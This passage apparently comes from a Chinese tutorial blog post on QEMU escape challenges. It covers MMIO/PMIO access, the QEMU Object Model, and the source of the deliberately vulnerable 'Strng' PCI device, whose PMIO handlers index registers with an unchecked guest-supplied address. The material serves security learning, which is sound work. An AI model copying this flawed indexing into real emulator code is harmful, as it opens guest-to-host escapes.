PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmio_mem @ %p\n&quot;</span>, mmio_mem);</span><br><span class="line"></span><br><span class="line">    mmio_read(<span class="number">0x128</span>);</span><br><span class="line">    mmio_write(<span class="number">0x128</span>, <span class="number">1337</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="访问pmio"><a href="#访问pmio" class="headerlink" title="访问pmio"></a>访问pmio</h3><p>编译内核模块，在内核空间访问pmio空间，示例代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/io.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/ioport.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">inb(port);  <span class="comment">//读取一字节</span></span><br><span class="line">inw(port);  <span class="comment">//读取两字节</span></span><br><span class="line">inl(port);  <span class="comment">//读取四字节</span></span><br><span class="line"></span><br><span class="line">outb(val,port); <span class="comment">//写一字节</span></span><br><span class="line">outw(val,port); <span class="comment">//写两字节</span></span><br><span class="line">outl(val,port); <span class="comment">//写四字节</span></span><br></pre></td></tr></table></figure><p>用户空间访问则需要先调用<code>iopl</code>函数申请访问端口，示例代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h &gt;</span></span></span><br><span class="line"></span><br><span class="line">iopl(<span class="number">3</span>); </span><br><span class="line">inb(port); </span><br><span class="line">inw(port); </span><br><span class="line">inl(port);</span><br><span class="line"></span><br><span class="line">outb(val,port); </span><br><span class="line">outw(val,port); </span><br><span class="line">outl(val,port);</span><br></pre></td></tr></table></figure><p>IOPL（Input/Output Privilege Level）系统调用是一种在Intel x86架构中的特权级别切换机制。在x86架构中，存在四个特权级别（0至3），其中0是最高特权级别，3是最低特权级别。IOPL允许用户态程序访问特权级别为0（内核态）的I/O端口，以执行一些需要系统级别权限的操作，比如直接访问硬件设备。</p><h2 id="QOM模型"><a href="#QOM模型" class="headerlink" title="QOM模型"></a>QOM模型</h2><p>QEMU是使用C编写而成,自然没有原生支持类与对象,但QEMU自己实现了一套称为<strong>Qemu Object Model</strong>的技术来实现面向对象</p><p>主要由这四个组件构成：</p><ul><li><code>Type</code>：用来定义一个「类」的基本属性，例如类的名字、大小、构造函数等。</li><li><code>Class</code>：用来定义一个「类」的静态内容，例如类中存储的静态数据、方法函数指针等。</li><li><code>Object</code>：动态分配的一个「类」的具体的实例（instance），储存类的动态数据。</li><li><code>Property</code>：动态对象数据的访问器（accessor），可以通过监视器接口进行检查。</li></ul><p>其中Property不多做关注,重点理解前三个</p><hr><p>上面的介绍乍一看还并不是很容易就懂的,用比较易懂的话再说一遍大概就是</p><p><code>Type</code>用于<strong>描述</strong>一个类,也就是描述一个具体的设备,由结构体<code>Typeinfo</code>实现,<code>Type</code>用于关联<code>Class</code>与<code>Object</code></p><p><code>Class</code>用于描述这个类的通用数据,例如<u>静态数据,方法函数</u>等对于所有类实例都是相同的数据,全局只有一个该<code>class</code></p><p><code>object</code>用于描述这个类的动态数据,也就是<u>独属于</u>每一个类实例的数据</p><h3 id="TypeInfo-类的基本属性"><a href="#TypeInfo-类的基本属性" class="headerlink" title="TypeInfo - 类的基本属性"></a>TypeInfo - 类的基本属性</h3><p><code>TypeInfo</code> 这一结构体用来定义一个 <code>类</code> 的基本属性，该结构体定义于 <code>include/qom/object.h</code> 当中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * TypeInfo:</span></span><br><span class="line"><span class="comment"> * @name: 类型名.</span></span><br><span class="line"><span class="comment"> * @parent: 父类型名.</span></span><br><span class="line"><span class="comment"> * @instance_size: 对象大小 (#Object 的衍生物). </span></span><br><span class="line"><span class="comment"> *   若 @instance_size 为 0, 则对象的大小为其父类的大小</span></span><br><span class="line"><span class="comment"> * @instance_init: 该函数被调用以初始化对象（译注：构造函数）. </span></span><br><span class="line"><span class="comment"> *   （译注：调用前）父类已被初始化，因此子类只需要初始化他自己的成员。</span></span><br><span class="line"><span class="comment"> * @instance_post_init: 该函数被调用以结束一个对象的初始化，</span></span><br><span class="line"><span class="comment"> *   在所有的 @instance_init 函数被调用之后.</span></span><br><span class="line"><span class="comment"> * @instance_finalize: 该函数在对象被析构时调用. 其在</span></span><br><span class="line"><span class="comment"> *   父类的 @instance_finalize 被调用之前被调用.</span></span><br><span class="line"><span class="comment"> *   在该函数中一个对象应当仅释放该对象特有的成员。</span></span><br><span class="line"><span class="comment"> * @abstract: 若该域为真，则该类为一个虚类，不能被直接实例化。</span></span><br><span class="line"><span class="comment"> * @class_size: 这个对象的类对象的大小 (#Object 的衍生物)</span></span><br><span class="line"><span class="comment"> *   若 @class_size 为 0, 则类的大小为其父类的大小。</span></span><br><span class="line"><span class="comment"> *   这允许一个类型在没有添加额外的虚函数时避免实现一个显式的类型。</span></span><br><span class="line"><span class="comment"> * @class_init: 该函数在所有父类初始化结束后被调用，</span></span><br><span class="line"><span class="comment"> *   以允许一个类设置他的默认虚方法指针.</span></span><br><span class="line"><span class="comment"> *   这也允许该函数重写父类的虚方法。</span></span><br><span class="line"><span class="comment"> * @class_base_init: 在所有的父类被初始化后、但</span></span><br><span class="line"><span class="comment"> *   在类自身初始化前，为所有的基类调用该函数。</span></span><br><span class="line"><span class="comment"> *   该函数用以撤销从父类 memcpy 到子类的影响.</span></span><br><span class="line"><span class="comment"> * @class_data: 传递给 @class_init 与 @class_base_init 的数据,</span></span><br><span class="line"><span class="comment"> *   这会在建立动态类型时有用。</span></span><br><span class="line"><span class="comment"> * @interfaces: 与这个类型相关的接口. </span></span><br><span class="line"><span class="comment"> *   其应当指向一个以 0 填充元素结尾的静态数组</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TypeInfo</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *parent;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> instance_size;</span><br><span class="line">    <span class="type">void</span> (*instance_init)(Object *obj);</span><br><span class="line">    <span class="type">void</span> (*instance_post_init)(Object *obj);</span><br><span class="line">    <span class="type">void</span> (*instance_finalize)(Object *obj);</span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span> abstract;</span><br><span class="line">    <span class="type">size_t</span> class_size;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*class_init)(ObjectClass *klass, <span class="type">void</span> *data);</span><br><span class="line">    <span class="type">void</span> (*class_base_init)(ObjectClass *klass, <span class="type">void</span> *data);</span><br><span class="line">    <span class="type">void</span> *class_data;</span><br><span class="line"></span><br><span class="line">    InterfaceInfo *interfaces;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当我们在 Qemu 中要定义一个<strong>类</strong>的时候，我们实际上需要定义一个 <code>TypeInfo</code> 类型的变量，以下是一个在 Qemu 定义一个自定义类的例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> TypeInfo my_type_info = &#123;</span><br><span class="line">    .name = <span class="string">&quot;my_type&quot;</span>,</span><br><span class="line">    .parent = TYPE_OBJECT,</span><br><span class="line">    .interfaces = (InterfaceInfo[]) &#123;</span><br><span class="line">        &#123; &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> my_register_types(<span class="type">void</span>) &#123;</span><br><span class="line">    type_register_static(&amp;my_type_info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type_init(my_register_types);</span><br></pre></td></tr></table></figure><p><code>type_init()</code> 其实就是 <code>constructor</code> 这一 gcc attribute 的封装，其作用就是将一个函数加入到一个 <code>init_array</code> 当中，在 Qemu 程序启动时在进入到 main 函数之前会先调用 <code>init_array</code> 中的函数，因此这里会调用我们自定义的函数，其作用便是调用 <code>type_register_static()</code> 将我们自定义的类型 <code>my_type_info</code> 注册到全局的类型表中。</p><h3 id="Class-类的静态内容"><a href="#Class-类的静态内容" class="headerlink" title="Class - 类的静态内容"></a>Class - 类的静态内容</h3><p>当我们通过一个 <code>TypeInfo</code> 结构体定义了一个类之后，我们还需要定义一个 Class 结构体来定义这个类的静态内容，包括函数表、静态成员等，其应当继承于对应的 Class 结构体类型，例如我们若是要定义一个新的机器类，则其 Class 应当继承于 <code>MachineClass</code>。</p><p>所有 Class 结构体类型的最终的父类都是 <code>ObjectClass</code> 结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ObjectClass:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 所有类的基类.  #ObjectClass 仅包含一个整型类型 handler</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ObjectClass</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    Type type;</span><br><span class="line">    GSList *interfaces;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *object_cast_cache[OBJECT_CLASS_CAST_CACHE];</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *class_cast_cache[OBJECT_CLASS_CAST_CACHE];</span><br><span class="line"></span><br><span class="line">    ObjectUnparent *unparent;</span><br><span class="line"></span><br><span class="line">    GHashTable *properties;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>下面是一个最简单的示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">myClass</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    ObjectClass parent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完成 Class 的定义之后我们还应当在前面定义的 <code>my_type_info</code> 中添加上 Class size 与 Class 的构造函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">my_class_init</span><span class="params">(ObjectClass *oc, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 这里的 oc 参数便是新创建的 Class，全局只有一个该实例</span></span><br><span class="line">    <span class="comment">// 我们应当 cast 为我们自己的 Class 类型，之后再进行相应操作</span></span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> TypeInfo my_type_info = &#123;</span><br><span class="line">    .name = <span class="string">&quot;my_type&quot;</span>,</span><br><span class="line">    .parent = TYPE_OBJECT,</span><br><span class="line">    .class_size = <span class="keyword">sizeof</span>(myClass),</span><br><span class="line">    .class_init = my_class_init,</span><br><span class="line">    .interfaces = (InterfaceInfo[]) &#123;</span><br><span class="line">        &#123; &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Object-类的实例对象"><a href="#Object-类的实例对象" class="headerlink" title="Object - 类的实例对象"></a>Object - 类的实例对象</h3><p>我们还需要定义一个相应的 Object 类型来表示一个实例对象，其包含有这个类实际的具体数据，且应当继承于对应的 Object 结构体类型，例如我们若是要定义一个新的机器类型，其实例类型应当继承自 <code>MachineState</code></p><p>所有 Object 结构体类型的最终的父类都是 <code>Object</code> 结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Object:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 所有对象的基类。该对象的第一个成员为一个指向 #ObjectClass 的指针。</span></span><br><span class="line"><span class="comment"> * 因为 C 中将一个结构体的第一个成员组织在该结构体的 0 字节起始处，</span></span><br><span class="line"><span class="comment"> * 只要任何的子类将其父类作为第一个成员，我们都能直接转化为一个 #Object.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 因此, #Object 包含一个对对象类的引用作为其第一个成员。 </span></span><br><span class="line"><span class="comment"> * 这允许在运行时识别对象的真实类型</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Object</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    ObjectClass *<span class="class"><span class="keyword">class</span>;</span></span><br><span class="line">    ObjectFree *<span class="built_in">free</span>;</span><br><span class="line">    GHashTable *properties;</span><br><span class="line">    <span class="type">uint32_t</span> ref;</span><br><span class="line">    Object *parent;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>下面是一个示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">myObject</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    Object parent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完成 Object 的定义之后我们还应当在前面定义的 <code>my_type_info</code> 中添加上 Object size 与 Object 的构造函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">my_object_init</span><span class="params">(Object *obj)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 这里的 obj 参数便是动态创建的类型实例</span></span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> TypeInfo my_type_info = &#123;</span><br><span class="line">    .name = <span class="string">&quot;my_type&quot;</span>,</span><br><span class="line">    .parent = TYPE_OBJECT,</span><br><span class="line">    .instance_init = my_object_init,</span><br><span class="line">    .instance_size = <span class="keyword">sizeof</span>(myObject),</span><br><span class="line">    .class_size = <span class="keyword">sizeof</span>(myClass),</span><br><span class="line">    .class_init = my_class_init,</span><br><span class="line">    .interfaces = (InterfaceInfo[]) &#123;</span><br><span class="line">        &#123; &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="类的创建与释放"><a href="#类的创建与释放" class="headerlink" title="类的创建与释放"></a>类的创建与释放</h3><p>类似于在 C++ 当中使用 <code>new</code> 与 <code>delete</code> 来创建与释放一个类实例，在 QOM 中我们应当使用 <code>object_new()</code> 与 <code>object_delete()</code> 来创建与销毁一个 QOM 类实例，本质上就是 <code>分配/释放类空间 + 显示调用构造/析构函数</code></p><p>QOM 判断创建类实例的类型是通过类的名字，即 <code>TypeInfo-&gt;name</code>，当创建类实例时 Qemu 会遍历所有的 TypeInfo 并寻找名字匹配的那个，从而调用到对应的构造函数，并将其基类 <code>Object-&gt;class</code> 指向对应的 class</p><p>下面是一个示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// create a QOM object</span></span><br><span class="line">myObject *myobj = object_new(<span class="string">&quot;my_type&quot;</span>);</span><br><span class="line"><span class="comment">// delete a QOM object</span></span><br><span class="line">object_delete(myobj);</span><br></pre></td></tr></table></figure><hr><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-05-02_212637.png" alt=""></p><h2 id="QOM实例"><a href="#QOM实例" class="headerlink" title="QOM实例"></a>QOM实例</h2><h3 id="Object与Class"><a href="#Object与Class" class="headerlink" title="Object与Class"></a>Object与Class</h3><p>这里以接下来要做的例题Strng为例,看看具体如何使用QOM写就一个PCI设备</p><p>首先是一个类的动态数据也就是<strong>Object部分</strong>,因为创建的是PCI设备,所以选择父类为PCIDevice</p><p>这里声明了两块内存<code>mmio</code>何<code>pmio</code>,以及几个寄存器</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    PCIDevice pdev;</span><br><span class="line">    MemoryRegion mmio;</span><br><span class="line">    MemoryRegion pmio;</span><br><span class="line">    <span class="type">uint32_t</span> addr;</span><br><span class="line">    <span class="type">uint32_t</span> regs[STRNG_MMIO_REGS];</span><br><span class="line">    <span class="type">void</span> (*srand)(<span class="type">unsigned</span> <span class="type">int</span> seed);</span><br><span class="line">    <span class="type">int</span> (*rand)(<span class="type">void</span>);</span><br><span class="line">    <span class="type">int</span> (*rand_r)(<span class="type">unsigned</span> <span class="type">int</span> *seed);</span><br><span class="line">&#125; STRNGState;</span><br></pre></td></tr></table></figure><p>之后是<strong>Class部分</strong>,本题没有定义直接使用PCIDeviceClass</p><p>不过也有不少题目会选择创建一个空的class模板,例如</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">STRNGClass</span> &#123;</span></span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    PCIDeviceClass parent;</span><br><span class="line">&#125; STRNGClass;</span><br></pre></td></tr></table></figure><p>然后还有将父类转为子类的宏，因为 QOM 基本函数传递的大都是父类指针，所以我们需要一个宏来进行类型检查 + 转型，这也是 Qemu 中惯用的做法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> STRNG(obj) OBJECT_CHECK(STRNGState, obj, <span class="string">&quot;strng&quot;</span>)</span></span><br></pre></td></tr></table></figure><h3 id="mmio-pmio读写函数"><a href="#mmio-pmio读写函数" class="headerlink" title="mmio/pmio读写函数"></a>mmio/pmio读写函数</h3><p>下面我们开始定义 MMIO 与 PMIO 的操作函数，并声明上两个 MemoryRegion 对应的函数表，需要注意的是这里传入的 <strong><code>hwaddr</code> 类型参数其实为相对地址而非绝对地址：</strong></p><p><strong>mmio</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">uint64_t</span> <span class="title function_">strng_mmio_read</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">unsigned</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    STRNGState *strng = opaque;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size != <span class="number">4</span> || addr &amp; <span class="number">3</span>)</span><br><span class="line">        <span class="keyword">return</span> ~<span class="number">0ULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> strng-&gt;regs[addr &gt;&gt; <span class="number">2</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">strng_mmio_write</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    STRNGState *strng = opaque;</span><br><span class="line">    <span class="type">uint32_t</span> saddr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size != <span class="number">4</span> || addr &amp; <span class="number">3</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    saddr = addr &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">switch</span> (saddr) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        strng-&gt;srand(val);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        strng-&gt;regs[saddr] = strng-&gt;rand();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        strng-&gt;regs[saddr] = strng-&gt;rand_r(&amp;strng-&gt;regs[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        strng-&gt;regs[saddr] = val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> MemoryRegionOps strng_mmio_ops = &#123;</span><br><span class="line">    .read = strng_mmio_read,</span><br><span class="line">    .write = strng_mmio_write,</span><br><span class="line">    .endianness = DEVICE_NATIVE_ENDIAN,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>pmio</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">uint64_t</span> <span class="title function_">strng_pmio_read</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">unsigned</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    STRNGState *strng = opaque;</span><br><span class="line">    <span class="type">uint64_t</span> val = ~<span class="number">0ULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size != <span class="number">4</span>)</span><br><span class="line">        <span class="keyword">return</span> val;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (addr) &#123;</span><br><span class="line">    <span class="keyword">case</span> STRNG_PMIO_ADDR:</span><br><span class="line">        val = strng-&gt;addr;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> STRNG_PMIO_DATA:</span><br><span class="line">        <span class="keyword">if</span> (strng-&gt;addr &amp; <span class="number">3</span>)</span><br><span class="line">            <span class="keyword">return</span> val;</span><br><span class="line"></span><br><span class="line">        val = strng-&gt;regs[strng-&gt;addr &gt;&gt; <span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">strng_pmio_write</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    STRNGState *strng = opaque;</span><br><span class="line">    <span class="type">uint32_t</span> saddr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size != <span class="number">4</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (addr) &#123;</span><br><span class="line">    <span class="keyword">case</span> STRNG_PMIO_ADDR:</span><br><span class="line">        strng-&gt;addr = val;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> STRNG_PMIO_DATA:</span><br><span class="line">        <span 